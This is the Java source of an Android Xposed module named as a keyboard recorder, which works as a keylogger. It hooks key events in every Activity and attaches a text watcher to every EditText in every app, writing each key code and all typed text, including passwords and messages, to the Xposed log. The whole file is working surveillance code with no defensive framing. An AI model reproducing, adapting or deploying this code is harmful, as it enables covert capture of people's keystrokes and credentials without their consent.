package com.github.snowdream.xposed_keyboard_recorder;

import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.EditText;
import de.robv.android.xposed.*;

import static de.robv.android.xposed.XposedHelpers.findClass;

import de.robv.android.xposed.callbacks.XC_LoadPackage;

import java.util.Set;

/**
 * Created by snowdream on 16-8-29.
 */
public class Main implements IXposedHookLoadPackage {
    private static final String TAG = "SnowdreamFramework";

    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        log("SnowdreamFramework","Launch app: " + loadPackageParam.packageName);

        hookKeyEvent(loadPackageParam.packageName);
        hookTextInput(loadPackageParam.packageName);
    }


    private void hookKeyEvent(final String packageName){
        //Getting the View class
        Class clazz = findClass("android.app.Activity", null);

        //Hooking it
        try {
            XposedHelpers.findAndHookMethod(clazz, "dispatchKeyEvent", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    super.afterHookedMethod(param);
                    if (param.args.length != 1 || !(param.args[0] instanceof KeyEvent)) {
                        return;
                    }

                    KeyEvent keyEvent = (KeyEvent) param.args[0];

                    log(packageName, "keyEvent code: " + keyEvent.getKeyCode());
                }
            });
        }catch (Exception e) {
            //Simply ignore
        }

    }



    //from https://github.com/giuliomvr/Xposed-Keylogger
    private void hookTextInput(final String packageName) {
        //Getting the View class
        Class clazz = findClass("android.view.View", null);
        //Hooking it
        final Set<XC_MethodHook.Unhook> unhooks = XposedBridge.hookAllConstructors(clazz, new XC_MethodHook() {

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                try {
                    //Dont hook it if its not an instance of EditText
                    if (!(param.thisObject instanceof EditText))
                        return;

                    //Cast this object into an EditText
                    final EditText et = (EditText) param.thisObject;
                    //Adding a listener
                    et.addTextChangedListener(new TextWatcher() {

                        @Override
                        public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                            //Do nothing
                        }

                        @Override
                        public void onTextChanged(CharSequence s, int start, int before, int count) {
                            //Do nothing
                        }

                        @Override
                        public void afterTextChanged(Editable s) {
                            log(packageName,"Text: "+ s.toString());
                        }

                    });
                } catch (Exception e) {
                    //Simply ignore
                }
            }

        });
    }

    private void log(String packageName, String str){
        StringBuilder builder = new StringBuilder();
        builder.append(TAG);
        builder.append("    ");
        builder.append("packageName: ");
        builder.append(packageName);
        builder.append("    ");
        builder.append(str);

        XposedBridge.log(builder.toString());
    }

//    @Override
//    public void initZygote(StartupParam startupParam) throws Throwable {
//        log(TAG,"initZygote");
//        hookKeyEvent(TAG);
//        hookTextInput(TAG);
//    }
}
